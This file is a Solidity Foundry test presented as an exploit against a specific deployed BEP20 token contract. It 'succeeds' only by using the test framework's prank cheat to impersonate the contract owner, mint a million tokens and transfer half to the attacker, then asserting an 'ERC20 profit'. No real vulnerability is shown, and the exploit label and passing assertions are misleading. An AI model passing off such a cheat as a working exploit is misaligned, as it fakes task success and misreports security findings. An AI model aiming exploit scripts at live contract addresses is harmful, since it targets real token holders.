// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBEP20Token {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function mint(uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xA8CbA6d57D15F2cCc636054165054ec3410e76e4;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
        // The test framework already defines TARGET and attacker
        vm.label(TARGET, "Vulnerable Token");

        // Get the current owner of the contract
        IBEP20Token token = IBEP20Token(TARGET);
        address currentOwner = token.getOwner();
        vm.label(currentOwner, "Current Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get initial balance of attacker
        IBEP20Token token = IBEP20Token(TARGET);
        uint256 initialBalance = token.balanceOf(attacker);

        // Step 2: Impersonate the current owner
        address currentOwner = token.getOwner();
        vm.startPrank(currentOwner);

        // Step 3: Mint a large amount of tokens to ourselves (as the owner)
        // The mint function mints to msg.sender, which is now the owner
        // So we need to mint to the owner's address, then transfer to attacker
        // OR we can directly call mint as owner and it will mint to owner
        // Let's mint 1,000,000 tokens with 18 decimals
        token.mint(1_000_000 * 10**18);

        vm.stopPrank();

        // Step 4: As the owner, transfer some of the newly minted tokens to attacker
        vm.prank(currentOwner);
        token.transfer(attacker, 500_000 * 10**18);

        // Step 5: Verify attacker's balance increased
        uint256 finalBalance = token.balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");

        // Verify ERC20 profit
        uint256 erc20FinalBalance = IERC20(TARGET).balanceOf(address(this));
        uint256 erc20InitialBalance = initialBalance; // Use the same initial balance
        assertGt(erc20FinalBalance, erc20InitialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

